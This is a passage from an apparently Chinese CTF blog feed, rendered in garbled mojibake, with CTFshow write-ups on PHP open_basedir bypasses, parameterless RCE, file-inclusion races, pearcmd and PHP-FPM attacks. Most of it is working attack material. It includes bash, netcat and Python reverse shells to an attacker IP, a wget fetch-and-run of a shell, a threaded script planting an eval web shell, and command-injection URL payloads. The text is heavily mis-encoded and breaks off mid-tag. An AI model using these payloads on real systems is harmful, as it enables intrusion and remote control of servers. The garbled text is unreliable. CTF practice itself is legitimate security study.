¹æ®è¿”å›å€¼æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨</p></li><li><p>åˆ©ç”¨SplFileInfo::getRealPath()ç±»æ–¹æ³•Bypass</p><p>è¿™ä¸ªå’Œä¸Šé¢é‚£ä¸ªå¾ˆç›¸ä¼¼ï¼Œä¹Ÿæ˜¯åŸºäºæŠ¥é”™ï¼Œç›´æ¥ç»™payloadå§</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpecho &#39;&lt;b&gt;open_basedir: &#39; . ini_get(&#39;open_basedir&#39;) . &#39;&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&#39;;$info &#x3D; new SplFileInfo($_GET[&#39;dir&#39;]);var_dump($info-&gt;getRealPath());?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>åˆ©ç”¨realpath()å‡½æ•°Bypass</p><blockquote><h3 id="realpath-å‡½æ•°-1"><a href="#realpath-å‡½æ•°-1" class="headerlink" title="realpath()å‡½æ•°"></a>realpath()å‡½æ•°</h3><p>(PHP 4, PHP 5, PHP 7)</p><p>realpath â€” è¿”å›è§„èŒƒåŒ–çš„ç»å¯¹è·¯å¾„åã€‚å®ƒå¯ä»¥å»æ‰å¤šä½™çš„../æˆ–./ç­‰è·³è½¬å­—ç¬¦ï¼Œèƒ½å°†ç›¸å¯¹è·¯å¾„è½¬æ¢æˆç»å¯¹è·¯å¾„ã€‚</p><p>å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">realpath ( string $path ) : string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Bypass-1"><a href="#Bypass-1" class="headerlink" title="Bypass"></a>Bypass</h3><p>ç¯å¢ƒæ¡ä»¶ï¼šWindows</p><p>åŸºæœ¬åŸç†æ˜¯åŸºäºæŠ¥é”™è¿”å›å†…å®¹çš„ä¸ç”¨ï¼Œè®¾ç½®è‡ªå®šä¹‰çš„é”™è¯¯å¤„ç†å‡½æ•°ï¼Œå¾ªç¯éå†åŒ¹é…åˆ°æ­£åˆ™çš„æŠ¥é”™ä¿¡æ¯çš„å­—ç¬¦æ¥é€ä¸ªæ‹¼æ¥æˆå­˜åœ¨çš„æ–‡ä»¶åï¼Œå¦å¤–æ˜¯éœ€è¦ç»“åˆåˆ©ç”¨Windowsä¸‹çš„ä¸¤ä¸ªç‰¹æ®Šçš„é€šé…ç¬¦&lt;å’Œ&gt;ï¼Œä¸ç„¶åªèƒ½è¿›è¡Œæš´ç ´ã€‚</p></blockquote><pre class="line-numbers language-none"><code class="language-none">&lt;?phpini_set(&#39;open_basedir&#39;, dirname(__FILE__));printf(&quot;&lt;b&gt;open_basedir: %s&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&quot;, ini_get(&#39;open_basedir&#39;));set_error_handler(&#39;isexists&#39;);$dir &#x3D; &#39;E:&#x2F;wamp64&#x2F;&#39;;$file &#x3D; &#39;&#39;;$chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;;for ($i&#x3D;0; $i &lt; strlen($chars); $i++) &#123;        $file &#x3D; $dir . $chars[$i] . &#39;&lt;&gt;&lt;&#39;;        realpath($file);&#125;function isexists($errno, $errstr)&#123;        $regexp &#x3D; &#39;&#x2F;File\((.*)\) is not within&#x2F;&#39;;        preg_match($regexp, $errstr, $matches);        if (isset($matches[1])) &#123;                printf(&quot;%s &lt;br&#x2F;&gt;&quot;, $matches[1]);        &#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œé¦–å­—æ¯ä¸åŒçš„æ–‡ä»¶å°±è¢«åˆ—å‡ºæ¥äº†ï¼Œé¦–å­—æ¯ç›¸åŒçš„æ–‡ä»¶ä¸­åªåˆ—äº†ç¬¬ä¸€ä¸ªï¼š</p><p><img src="https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/10.png" alt="img"></p></li></ol><p>æœ€åæ˜¯å¤§ä½¬è„šæœ¬</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php&#x2F;** by phithon* From https:&#x2F;&#x2F;www.leavesongs.com* detail: http:&#x2F;&#x2F;cxsecurity.com&#x2F;issue&#x2F;WLB-2009110068*&#x2F;header(&#39;content-type: text&#x2F;plain&#39;);error_reporting(-1);ini_set(&#39;display_errors&#39;, TRUE);printf(&quot;open_basedir: %s\nphp_version: %s\n&quot;, ini_get(&#39;open_basedir&#39;), phpversion());printf(&quot;disable_functions: %s\n&quot;, ini_get(&#39;disable_functions&#39;));$file &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, isset($_REQUEST[&#39;file&#39;]) ? $_REQUEST[&#39;file&#39;] : &#39;&#x2F;etc&#x2F;passwd&#39;);$relat_file &#x3D; getRelativePath(__FILE__, $file);$paths &#x3D; explode(&#39;&#x2F;&#39;, $file);$name &#x3D; mt_rand() % 999;$exp &#x3D; getRandStr();mkdir($name);chdir($name);for($i &#x3D; 1 ; $i &lt; count($paths) - 1 ; $i++)&#123;    mkdir($paths[$i]);    chdir($paths[$i]);&#125;mkdir($paths[$i]);for ($i -&#x3D; 1; $i &gt; 0; $i--) &#123;     chdir(&#39;..&#39;);&#125;$paths &#x3D; explode(&#39;&#x2F;&#39;, $relat_file);$j &#x3D; 0;for ($i &#x3D; 0; $paths[$i] &#x3D;&#x3D; &#39;..&#39;; $i++) &#123;     mkdir($name);    chdir($name);    $j++;&#125;for ($i &#x3D; 0; $i &lt;&#x3D; $j; $i++) &#123;     chdir(&#39;..&#39;);&#125;$tmp &#x3D; array_fill(0, $j + 1, $name);symlink(implode(&#39;&#x2F;&#39;, $tmp), &#39;tmplink&#39;);$tmp &#x3D; array_fill(0, $j, &#39;..&#39;);symlink(&#39;tmplink&#x2F;&#39; . implode(&#39;&#x2F;&#39;, $tmp) . $file, $exp);unlink(&#39;tmplink&#39;);mkdir(&#39;tmplink&#39;);delfile($name);$exp &#x3D; dirname($_SERVER[&#39;SCRIPT_NAME&#39;]) . &quot;&#x2F;&#123;$exp&#125;&quot;;$exp &#x3D; &quot;http:&#x2F;&#x2F;&#123;$_SERVER[&#39;SERVER_NAME&#39;]&#125;&#123;$exp&#125;&quot;;echo &quot;\n-----------------content---------------\n\n&quot;;echo file_get_contents($exp);delfile(&#39;tmplink&#39;);function getRelativePath($from, $to) &#123;  &#x2F;&#x2F; some compatibility fixes for Windows paths  $from &#x3D; rtrim($from, &#39;\&#x2F;&#39;) . &#39;&#x2F;&#39;;  $from &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $from);  $to   &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $to);  $from   &#x3D; explode(&#39;&#x2F;&#39;, $from);  $to     &#x3D; explode(&#39;&#x2F;&#39;, $to);  $relPath  &#x3D; $to;  foreach($from as $depth &#x3D;&gt; $dir) &#123;    &#x2F;&#x2F; find first non-matching dir    if($dir &#x3D;&#x3D;&#x3D; $to[$depth]) &#123;      &#x2F;&#x2F; ignore this directory      array_shift($relPath);    &#125; else &#123;      &#x2F;&#x2F; get number of remaining dirs to $from      $remaining &#x3D; count($from) - $depth;      if($remaining &gt; 1) &#123;        &#x2F;&#x2F; add traversals up to first matching dir        $padLength &#x3D; (count($relPath) + $remaining - 1) * -1;        $relPath &#x3D; array_pad($relPath, $padLength, &#39;..&#39;);        break;      &#125; else &#123;        $relPath[0] &#x3D; &#39;.&#x2F;&#39; . $relPath[0];      &#125;    &#125;  &#125;  return implode(&#39;&#x2F;&#39;, $relPath);&#125;function delfile($deldir)&#123;    if (@is_file($deldir)) &#123;        @chmod($deldir,0777);        return @unlink($deldir);    &#125;else if(@is_dir($deldir))&#123;        if(($mydir &#x3D; @opendir($deldir)) &#x3D;&#x3D; NULL) return false;        while(false !&#x3D;&#x3D; ($file &#x3D; @readdir($mydir)))        &#123;            $name &#x3D; File_Str($deldir.&#39;&#x2F;&#39;.$file);            if(($file!&#x3D;&#39;.&#39;) &amp;&amp; ($file!&#x3D;&#39;..&#39;))&#123;delfile($name);&#125;        &#125;         @closedir($mydir);        @chmod($deldir,0777);        return @rmdir($deldir) ? true : false;    &#125;&#125;function File_Str($string)&#123;    return str_replace(&#39;&#x2F;&#x2F;&#39;,&#39;&#x2F;&#39;,str_replace(&#39;\\&#39;,&#39;&#x2F;&#39;,$string));&#125;function getRandStr($length &#x3D; 6) &#123;    $chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;    $randStr &#x3D; &#39;&#39;;    for ($i &#x3D; 0; $i &lt; $length; $i++) &#123;        $randStr .&#x3D; substr($chars, mt_rand(0, strlen($chars) - 1), 1);    &#125;    return $randStr;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>includeè¿œç¨‹æ–‡ä»¶åä¼ å‚fileå³å¯</p><p><strong>806</strong></p><h3 id="phpæ— å‚RCE-1"><a href="#phpæ— å‚RCE-1" class="headerlink" title="phpæ— å‚RCE"></a>phpæ— å‚RCE</h3><p>é¦–å…ˆæ˜¯ä¸€ç¯‡å¯ä¾›å‚è€ƒçš„<a href="https://blog.csdn.net/qq_45570082/article/details/106602261">æ–‡ç« </a></p><p>åˆ©ç”¨æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§</p><ol><li><p><strong>åˆ©ç”¨session_id</strong></p><p>phpä¸­æœ‰ä¸€ä¸ªå‡½æ•°å«session_id(),å¯ä»¥ç›´æ¥è·å–åˆ°cookieä¸­çš„phpsessionidå€¼ï¼Œphpsessionidçš„ç»„æˆç¬¦å·æœ‰é™å®š,ä¸èƒ½ä½¿ç”¨ â€™ () â€˜ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤è½¬æ¢æˆ16è¿›åˆ¶ï¼Œç„¶åå†é€šè¿‡hex2binå‡½æ•°è½¬æ¢å›å»ï¼Œ<code>bin2hex(&#39;payload&#39;);</code>æ¥è½¬æ¢16ç¦æ­¢ï¼Œåœ¨ä½¿ç”¨æ—¶é€šè¿‡<code>eval(hex2bin(session_id(session_start())));</code>ï¼Œåœ¨åŠ ä¸Šè¯·æ±‚å¤´ä¸­Cookieä¸­çš„<code>PHPSESSID=16è¿›åˆ¶payload</code>æ‰§è¡Œ</p></li><li><p><strong>åˆ©ç”¨<code>get_defined_vars ()</code>å‡½æ•°</strong></p><p><code>get_defined_vars()</code>ï¼šè¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„</p><p>å¯ä¾›åˆ©ç”¨çš„å‡½æ•°</p><pre class="line-numbers language-none"><code class="language-none">end() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚next() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚prev() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚reset() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚each() - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°åœ¨å·²å®šä¹‰çš„å˜é‡ä¸­å­˜åœ¨ç€å…¨å±€å˜é‡GETå’ŒPOSTï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥å‚æ•°æ¥å®ç°RCE</p><pre class="line-numbers language-none"><code class="language-none">payload:?a&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>æ–‡ä»¶è¯»å–</p><p>å¯ä¾›åˆ©ç”¨çš„å‡½æ•°</p><pre class="line-numbers language-none"><code class="language-none">var_dump()  æ‰“å°æ‰€æœ‰å†…å®¹print_r()  åŒä¸Šscandir()  æ‰«æè·¯å¾„å†…æ–‡ä»¶åå¹¶è¿”å›ä¸€ä¸ªè¿­ä»£å™¨localeconv()  getcwd()  è·å¾—å½“å‰å·¥ä½œç›®å½•getallheaders()  è·å¾—è¯·æ±‚å¤´å†…å®¹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p><strong>807</strong></p><h3 id="åå¼¹shell-1"><a href="#åå¼¹shell-1" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><p>æœ¬åœ°ç›‘å¬ç«¯å£ï¼Œè®°ä½è¦æœ‰å…¬ç½‘IPï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨frpå†…ç½‘ç©¿é€</p><ol><li><p>å…¬ç½‘æœåŠ¡å™¨</p><p>ç›‘å¬å‘½ä»¤</p><pre class="line-numbers language-none"><code class="language-none">æ”»å‡»ç«¯nc -lvp ç›‘å¬çš„ç«¯å£å—å®³ç«¯bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;æ”»å‡»ç«¯IP&#x2F;æ”»å‡»ç«¯ç›‘å¬ç«¯å£ 0&gt;&amp;1nc æ”»å‡»ç«¯IP æ”»å‡»ç«¯ç›‘å¬ç«¯å£ -t &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ©ç”¨wgetä¸‹è½½æ‰§è¡Œ</p><pre class="line-numbers language-none"><code class="language-none">wget æ”»å‡»ç«¯IP&#x2F;shell.txt -O &#x2F;tmp&#x2F;shell.php &amp;&amp; php &#x2F;tmp&#x2F;shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>pythonè„šæœ¬åå¼¹</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python#-*- coding: utf-8 -*-import socket,subprocess,oss&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;æ”»å‡»ç«¯IP&quot;,æ”»å‡»ç«¯ç›‘å¬ç«¯å£)) #æ›´æ”¹localhostä¸ºâ¾ƒâ¼°çš„å¤–â½¹ip,ç«¯â¼ä»»æ„os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p><strong>808</strong></p><h3 id="å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«-1"><a href="#å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«-1" class="headerlink" title="å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«"></a>å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«</h3><pre class="line-numbers language-none"><code class="language-none">import requestsimport threadingimport syssession&#x3D;requests.session()sess&#x3D;&#39;yu22x&#39;url1&#x3D;&quot;http:&#x2F;&#x2F;97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show&#x2F;&quot;url2&#x3D;&#39;http:&#x2F;&#x2F;97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show&#x2F;?file&#x3D;&#x2F;tmp&#x2F;sess_yu22x&#39;data1&#x3D;&#123;    &#39;PHP_SESSION_UPLOAD_PROGRESS&#39;:&#39;&lt;?php eval($_POST[1]);?&gt;&#39;&#125;data2&#x3D;&#123;    &#39;1&#39;:&#39;echo 11123;system(&quot;cat &#x2F;*&quot;);&#39;,&#125;file&#x3D;&#123;    &#39;file&#39;:&#39;1&#39;&#125;cookies&#x3D;&#123;    &#39;PHPSESSID&#39;: sess&#125;def write():    while True:        r &#x3D; session.post(url1,data&#x3D;data1,files&#x3D;file,cookies&#x3D;cookies)def read():    while True:        r &#x3D; session.post(url2,data&#x3D;data2)        if &#39;11123&#39; in r.text:            print(r.text)if __name__&#x3D;&#x3D;&quot;__main__&quot;:    event&#x3D;threading.Event()    with requests.session() as session:        for i in range(1,30):             threading.Thread(target&#x3D;write).start()        for i in range(1,30):            threading.Thread(target&#x3D;read).start()    event.set()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çº¯çº¯çœ‹è¿æ°”</p><p><strong>809</strong></p><h3 id="pearæ–‡ä»¶åŒ…å«-RCE-1"><a href="#pearæ–‡ä»¶åŒ…å«-RCE-1" class="headerlink" title="pearæ–‡ä»¶åŒ…å«/RCE"></a>pearæ–‡ä»¶åŒ…å«/RCE</h3><p>æ–‡ç« <a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">åœ¨æ­¤</a></p><blockquote><p>peclæ˜¯PHPä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œpearæ˜¯peclä¾èµ–çš„ç±»åº“ã€‚åœ¨7.3åŠä»¥å‰ï¼Œpecl/pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®š<code>--with-pear</code>æ‰ä¼šå®‰è£…ã€‚</p><p>ä¸è¿‡ï¼Œåœ¨Dockerä»»æ„ç‰ˆæœ¬é•œåƒä¸­ï¼Œpcel/pearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨<code>/usr/local/lib/php</code>ã€‚</p><p>åŸæœ¬pear/pcelæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¹¶ä¸åœ¨Webç›®å½•ä¸‹ï¼Œå³ä½¿å­˜åœ¨ä¸€äº›å®‰å…¨éšæ‚£ä¹Ÿæ— éœ€æ‹…å¿ƒã€‚ä½†æˆ‘ä»¬é‡åˆ°çš„åœºæ™¯æ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„åœºæ™¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åŒ…å«åˆ°pearä¸­çš„æ–‡ä»¶ï¼Œè¿›è€Œåˆ©ç”¨å…¶ä¸­çš„ç‰¹æ€§æ¥æäº‹ã€‚</p><p>æˆ‘æœ€æ—©çš„æ—¶å€™æ˜¯åœ¨é˜…è¯»phpinfo()çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°Dockerç¯å¢ƒä¸‹çš„PHPä¼šå¼€å¯<code>register_argc_argv</code>è¿™ä¸ªé…ç½®ã€‚æ–‡æ¡£ä¸­å¯¹è¿™ä¸ªé€‰é¡¹çš„ä»‹ç»ä¸æ˜¯ç‰¹åˆ«æ¸…æ¥šï¼Œå¤§æ¦‚çš„æ„æ€æ˜¯ï¼Œå½“å¼€å¯äº†è¿™ä¸ªé€‰é¡¹ï¼Œç”¨æˆ·çš„è¾“å…¥å°†ä¼šè¢«èµ‹äºˆç»™<code>$argc</code>ã€<code>$argv</code>ã€<code>$_SERVER[&#39;argv&#39;]</code>å‡ ä¸ªå˜é‡ã€‚</p><p>å¦‚æœPHPä»¥å‘½ä»¤è¡Œçš„å½¢å¼è¿è¡Œï¼ˆå³sapiæ˜¯cliï¼‰ï¼Œè¿™é‡Œå¾ˆå¥½ç†è§£ã€‚ä½†å¦‚æœPHPä»¥Serverçš„å½¢å¼è¿è¡Œï¼Œä¸”åˆå¼€å¯äº†<code>register_argc_argv</code>ï¼Œé‚£ä¹ˆè¿™å…¶ä¸­æ˜¯æ€ä¹ˆå¤„ç†çš„ï¼Ÿ</p><p>HTTPæ•°æ®åŒ…ä¸­çš„query-stringä¼šè¢«ä½œä¸ºargvçš„å€¼</p></blockquote><p>æœ€ç»ˆæ„é€ çš„payloadå¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">?+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;&lt;?&#x3D;phpinfo()?&gt;+&#x2F;tmp&#x2F;hello.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ­¤æ—¶/tmp/hello.phpæ–‡ä»¶ä¸­å°±æœ‰äº†æˆ‘ä»¬å†™å…¥çš„<code>&lt;?=phpinfo()?&gt;</code>ï¼Œæ–‡ä»¶åŒ…å«å³å¯</p><p><strong>810</strong></p><h3 id="SSRFæ‰“PHP-FPM-1"><a href="#SSRFæ‰“PHP-FPM-1" class="headerlink" title="SSRFæ‰“PHP-FPM"></a>SSRFæ‰“PHP-FPM</h3><p>æœ‰å·¥å…·ä¸ç”¨***</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206081711243.png"></p><p>è®°å¾—ä¼ å…¥çš„æ—¶å€™urlç¼–ç ä¸€ä¸‹</p><p><strong>811</strong></p><h3 id="file-put-contentsæ‰“PHP-FPM"><a href="#file-put-contentsæ‰“PHP-FPM" class="headerlink" title="file_put_contentsæ‰“PHP-FPM"></a>file_put_contentsæ‰“PHP-FPM</h3><p>æ–‡ç« åœ¨<a href="https://blog.csdn.net/sdst_/article/details/118080811">è¿™é‡Œ</a></p><p>ç”¨çš„yu22xå¸ˆå‚…çš„è„šæœ¬</p><ol><li><p>ä¼ªé€ ftpæœåŠ¡å™¨</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token number">4566</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#ç«¯å£å¯æ”¹</span>s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'220 welcome\n'</span><span class="token punctuation">)</span><span class="token comment">#Service ready for new user.</span><span class="token comment">#Client send anonymous username</span><span class="token comment">#USER anonymous</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'331 Please specify the password.\n'</span><span class="token punctuation">)</span><span class="token comment">#User name okay, need password.</span><span class="token comment">#Client send anonymous password.</span><span class="token comment">#PASS anonymous</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'230 Login successful.\n'</span><span class="token punctuation">)</span><span class="token comment">#User logged in, proceed. Logged out if appropriate.</span><span class="token comment">#TYPE I</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'200 Switching to Binary mode.\n'</span><span class="token punctuation">)</span><span class="token comment">#Size /</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'550 Could not get the file size.\n'</span><span class="token punctuation">)</span><span class="token comment">#EPSV (1)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 ok\n'</span><span class="token punctuation">)</span><span class="token comment">#PASV</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n'</span><span class="token punctuation">)</span> <span class="token comment">#STOR / (2)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 Permission denied.\n'</span><span class="token punctuation">)</span><span class="token comment">#QUIT</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'221 Goodbye.\n'</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>gopherusç”Ÿæˆpayload</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206082140193.png"></p></li><li><p>vpsç›‘å¬ä¼ å‚</p><pre class="line-numbers language-none"><code class="language-none">file&#x3D;ftp:&#x2F;&#x2F;x.x.x.x:4566&amp;content&#x3D;gopherusç”Ÿæˆçš„payload(åªå–ä¸‹åˆ’çº¿åé¢çš„å†…å®¹ï¼Œä¸”ä¸éœ€è¦å†æ¬¡ç¼–ç )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>812</strong></p><h3 id="PHP-FPMæœªæˆæƒ"><a href="#PHP-FPMæœªæˆæƒ" class="headerlink" title="PHP-FPMæœªæˆæƒ"></a>PHP-FPMæœªæˆæƒ</h3><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowå…¶ä»–</title>
      <link href="/posts/6352d546.html"/>
      <url>/posts/6352d546.html</url>
      
        <content type="html"><![CDATA[<p><strong>396</strong></p><p><code>parse_url</code>å‡½æ•°å°†ä¸€ä¸ªurlæ‹†åˆ†ä¸ºå¦‚ä¸‹å½¢å¼</p><p><img src="https://img-blog.csdnimg.cn/20210628090124739.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ— éœ€ç»•è¿‡ï¼Œç›´æ¥æ„é€ </p><pre class="line-numbers language-none"><code class="language-none">payload:?url&#x3D;http:&#x2F;&#x2F;l&#x2F;l;cat fl0g* &gt;1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>397</strong></p><p>åŠ äº†ä¸ª/tmpä¹Ÿæ²¡å•¥åµç”¨ï¼ŒåŒä¸Šå³å¯</p><p><strong>398</strong></p><p>åœ¨hostå¤„åŠ äº†/;è¿‡æ»¤ï¼Œä¹Ÿæ²¡å•¥ç”¨</p><p><strong>399</strong></p><p>ä¸ºå•¥è·Ÿhostè¿‡ä¸å»å•Šï¼Œå¤šæ»¤äº†ä¸ª&gt;</p><p><strong>400</strong></p><p>è¿‡æ»¤httpä¹Ÿæ²¡ç”¨</p><p><strong>401</strong></p><p>åŒä¸Š</p><p><strong>402</strong></p><p>åœ¨schemeå¤„è¿‡æ»¤httpï¼Œæ¢ä¸ªåè®®å°±è¡Œ</p><p><strong>403</strong></p><pre class="line-numbers language-none"><code class="language-none">if(preg_match(&#39;&#x2F;^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)$&#x2F;&#39;, $url[&#39;host&#39;]))&#123;         shell_exec(&#39;curl &#39;.$url[&#39;scheme&#39;].$url[&#39;host&#39;].$url[&#39;path&#39;]);     &#125; <span aria-hidden="true" 